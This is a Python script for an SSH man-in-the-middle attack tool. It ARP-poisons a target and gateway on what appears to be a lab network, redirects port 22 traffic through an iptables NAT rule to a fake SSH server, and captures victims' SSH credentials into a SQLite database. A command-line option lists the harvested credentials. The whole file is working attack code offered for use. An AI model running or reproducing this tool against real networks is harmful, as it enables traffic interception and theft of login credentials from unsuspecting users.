from sshserver import serve_ssh,set_remote_server_address
from arpspoof import arp_poison,stop_poison
from scapy.all import *
from sshcredentialsdb import CredentialsStore
import os
import argparse
from pathlib import Path
import subprocess

class NotSudo(Exception):
    pass

def process_packet(packet):
    if packet["TCP"].flags == 0x02:
        set_remote_server_address(packet[0][1].dst)

# victim ip address
target = "192.168.56.3"
# gateway ip address
gateway = "192.168.56.2"
# sqlite database file name
db_name = "credentials.db"

def ssh_mitm(target,gateway,db_name):
    if os.getuid() != 0:
        raise NotSudo("This program is not run as sudo or elevated this it will not work")
    poison_thread = threading.Thread(target=arp_poison,args = (target,gateway))
    poison_thread.daemon = True
    poison_thread.start()
    serve_ssh_thread = threading.Thread(target=serve_ssh,args= (db_name,))
    serve_ssh_thread.daemon = True
    serve_ssh_thread.start()
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        os.system('iptables -v -t nat  -A PREROUTING -p tcp --destination-port 22 -j REDIRECT --to-port 2200')
        packets_filter = f"port 22"
        packets = sniff(filter=packets_filter, iface="eth0", prn=process_packet)

    except KeyboardInterrupt:
        pass
    
    finally:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        stop_poison()
        poison_thread.join()
        wrpcap('sshmitm.pcap', packets)
        os.system("iptables --flush")
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser()


    parser.add_argument("-t", "--target",type=str)
    parser.add_argument("-g", "--gateway",type=str)
    parser.add_argument("-d", "--db",type=str)
    parser.add_argument("-l", "--list", action="store_true")
    parser.add_argument("-u", "--username",type=str)
    parser.add_argument("-s", "--sshmachine",type=str)
    
    args = parser.parse_args()
    
    if args.db is not None:
        db_name = args.db
        
    if args.target is not None:
        target = args.target
        
    if args.gateway is not None:
        gateway = args.gateway
    
    if args.list:
        credentials_store = CredentialsStore(db_name)
        if args.username is not None and args.sshmachine is not None:
            credentials = credentials_store.get_credentials_by_username_and_machine(args.username,args.sshmachine)
        elif args.username is not None:
            credentials = credentials_store.get_credentials_by_username(args.username)
        elif args.sshmachine is not None:
            credentials = credentials_store.get_credentials_by_machine(args.sshmachine)
        else:
            credentials = credentials_store.get_all_credentials()
            
        for credential in credentials:
                print(credential)
    
    else:
        ssh_mitm(target,gateway,db_name)